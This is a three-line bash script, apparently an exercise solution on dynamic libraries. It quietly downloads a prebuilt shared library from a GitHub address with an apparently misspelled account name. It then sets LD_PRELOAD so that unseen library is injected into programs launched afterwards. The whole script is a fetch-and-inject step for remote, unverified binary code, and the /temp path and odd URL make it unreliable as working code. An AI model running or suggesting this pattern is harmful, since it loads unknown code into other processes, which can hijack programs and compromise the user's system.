#!/bin/bash
wget -q -O /temp/try.so https://github.com/holbertonschoo/0x18.c.git/raw/master/0x18-dynamic_libraries/try.so
export LD_PRELOAD=/temp/try.so
